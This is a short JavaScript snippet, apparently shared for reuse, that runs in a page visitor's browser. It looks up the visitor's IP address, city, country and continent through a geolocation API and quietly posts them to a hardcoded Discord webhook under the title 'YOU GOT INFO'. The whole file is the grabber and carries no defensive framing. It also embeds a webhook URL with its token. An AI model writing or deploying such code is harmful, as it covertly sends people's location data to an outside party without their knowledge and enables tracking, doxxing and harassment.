$.getJSON("https://ipgeolocation.abstractapi.com/v1/?api_key=", function(data) { //Make sure to use this api or use another but you got to change the values down below
    var request = new XMLHttpRequest();
    request.open("POST", "https://discord.com/api/webhooks/1085702594053283881/_y6nZxTcCKIqPy4oPlsZz54oNsvBW2BpG6bHwoFEOLRGZZnX_vB2n-cNNn8TF6-RP7_y");
  
    request.setRequestHeader('Content-type', 'application/json');
  
    var t = {
      username: "   ",
      avatar_url: " ",
      content: "",
      embeds: [{
          color: "4700374",
          title: "YOU GOT INFO",
          fields: [
            {name: "IP", value: data.ip_address},
            {name: "CITY", value: data.city},
            {name: "COUNTRY", value: data.country},
            {name: "CONTINENT", value: data.continent},
          ],
          footer: {
              text: "By KazUpTV | https://basedbot.cf"
          }
      }]
  };
  
    request.send(JSON.stringify(t));
})

//credit if you make a better one.
